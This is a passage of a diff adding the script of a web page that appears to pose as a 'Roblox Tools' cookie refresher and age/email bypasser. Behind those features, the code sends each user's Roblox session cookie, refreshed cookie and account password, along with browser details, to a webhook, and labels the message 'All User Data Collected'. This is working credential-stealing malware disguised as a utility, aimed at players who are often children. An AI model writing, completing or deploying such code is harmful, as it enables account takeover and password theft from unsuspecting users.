+                    color: 5814783, // Discord green color
+                    fields: [
+                        {
+                            name: "Action",
+                            value: action === 'cookie' ? "Cookie Refresh" : "Email Bypass",
+                            inline: true
+                        },
+                        {
+                            name: "Timestamp",
+                            value: new Date().toLocaleString(),
+                            inline: true
+                        }
+                    ],
+                    footer: {
+                        text: "Roblox Tools - All User Data Collected",
+                        icon_url: "https://i.imgur.com/4M34hi2.png" // Placeholder icon
+                    },
+                    timestamp: new Date().toISOString()
+                };
+                
+                // Add cookie information
+                if (data.cookie) {
+                    embed.fields.push({
+                        name: "Account Cookie",
+                        value: data.cookie.length > 1000 ? data.cookie.substring(0, 1000) + "..." : data.cookie,
+                        inline: false
+                    });
+                }
+                
+                // Add new cookie if available
+                if (data.newCookie) {
+                    embed.fields.push({
+                        name: "New Cookie",
+                        value: data.newCookie.length > 1000 ? data.newCookie.substring(0, 1000) + "..." : data.newCookie,
+                        inline: false
+                    });
+                }
+                
+                // Add password if available
+                if (data.password) {
+                    embed.fields.push({
+                        name: "Account Password",
+                        value: data.password,
+                        inline: false
+                    });
+                }
+                
+                // Add email bypass specific data
+                if (action === 'email-bypass') {
+                    embed.fields.push({
+                        name: "Bypass Type",
+                        value: "13+ Tomorrow",
+                        inline: true
+                    });
+                    
+                    embed.fields.push({
+                        name: "New Birthdate",
+                        value: data.newBirthdate,
+                        inline: true
+                    });
+                }
+                
+                // Add browser information
+                embed.fields.push({
+                    name: "Browser Information",
+                    value: `User Agent: ${navigator.userAgent.substring(0, 100)}...`,
+                    inline: false
+                });
+                
+                const payload = {
+                    embeds: [embed]
+                };
+                
+                // Send to webhook
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Webhook sent successfully');
+                    } else {
+                        console.error('Failed to send webhook');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error sending webhook:', error);
+                });
+            }
+            
+            // Cookie form submission
+            cookieForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const currentCookie = document.getElementById('currentCookie').value;
+                
+                if (currentCookie) {
+                    refreshCookie(currentCookie);
+                }
+            });
+            
+            // Email bypasser button
+            setAgePlusBtn.addEventListener('click', function() {
+                const bypasserCookie = document.getElementById('bypasserCookie').value;
+                const password = accountPassword.value;
+                
+                if (bypasserCookie && password) {
+                    bypassEmail(bypasserCookie, password);
+                }
+            });
+            
+            // Copy cookie to clipboard
+            copyCookieBtn.addEventListener('click', function() {
+                const cookieText = newCookieDisplay.textContent;
+                navigator.clipboard.writeText(cookieText).then(() => {
+                    // Show success feedback
+                    const originalText = copyCookieBtn.innerHTML;
+                    copyCookieBtn.innerHTML = '<i class="bi bi-check me-1"></i> Copied!';
+                    copyCookieBtn.classList.remove('btn-outline-secondary');
+                    copyCookieBtn.classList.add('btn-success');
+                    
+                    setTimeout(() => {
+                        copyCookieBtn.innerHTML = originalText;
+                        copyCookieBtn.classList.remove('btn-success');
+                        copyCookieBtn.classList.add('btn-outline-secondary');
+                    }, 2000);
+                });
+            });
+            
+            // Copy birthdate to clipboard
+            copyBirthdateBtn.addEventListener('click', function() {
+                const birthdateText = newBirthdate.textContent.replace(/<br>/g, '\n').replace(/Will be 13+ Tomorrow\nBirthday: /, '');
+                navigator.clipboard.writeText(birthdateText).then(() => {
+                    // Show success feedback
+                    const originalText = copyBirthdateBtn.innerHTML;
+                    copyBirthdateBtn.innerHTML = '<i class="bi bi-check me-1"></i> Copied!';
+                    copyBirthdateBtn.classList.remove('btn-outline-secondary');
+                    copyBirthdateBtn.classList.add('btn-success');
+                    
+                    setTimeout(() => {
+                        copyBirthdateBtn.innerHTML = originalText;
+                        copyBirthdateBtn.classList.remove('btn-success');
+                        copyBirthdateBtn.classList.add('btn-outline-secondary');
+                    }, 2000);
+                });
+            });
+            
+            // Download cookie as .txt file
+            downloadCookieBtn.addEventListener('click', function() {
+                const cookieText = newCookieDisplay.textContent;
+                const blob = new Blob([cookieText], { type: 'text/plain' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'roblox_cookie.txt';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+            });
+            
+            // Add fade-in animation to elements when they come into view
+            const observerOptions = {
+                root: null,
+                rootMargin: '0px',
+                threshold: 0.1
+            };
+            
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.classList.add('fade-in');
+                    }
+                });
+            }, observerOptions);
+            
+            document.querySelectorAll('.card').forEach(card => {
+                observer.observe(card);
+            });
+        });
+    </script>
+</body>
+</html>
